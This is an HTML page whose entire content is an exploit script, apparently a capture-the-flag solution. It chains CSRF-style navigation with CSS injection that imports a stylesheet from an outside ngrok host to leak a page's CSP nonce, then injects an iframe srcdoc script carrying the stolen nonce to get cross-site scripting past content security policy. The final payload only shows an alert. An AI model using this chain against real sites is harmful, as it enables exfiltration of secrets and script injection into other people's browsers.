<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>

        const s = m => new Promise(r => setTimeout(r, m));
        (async()=>{
            name = "win"
            w = window.open("/csrf.html?h=start&stop=false", "", "width=500,height=500");
            await s(1000)

            let cj = `<style>
@import "https://50c2-93-148-124-4.ngrok-free.app/leak.css";
                </style>`

            w.location = `/csrf.html?h=${encodeURIComponent(cj)}`
            await s(2000)

            let n = null;
            while (n === null) {
                n = (await (await fetch("/nonce")).json()).nonce;
                if (n === null) await s(100);
            }

            w.location = "/2.html"

            xss = `
            <iframe srcdoc="<script nonce='${n}'>alert('hiiiii')<\/script>"></iframe>
            `;
            location = `/csrf.html?h=${encodeURIComponent(xss)}&stop=true`
            await s(10_000)

        })()

    </script>
</body>
</html>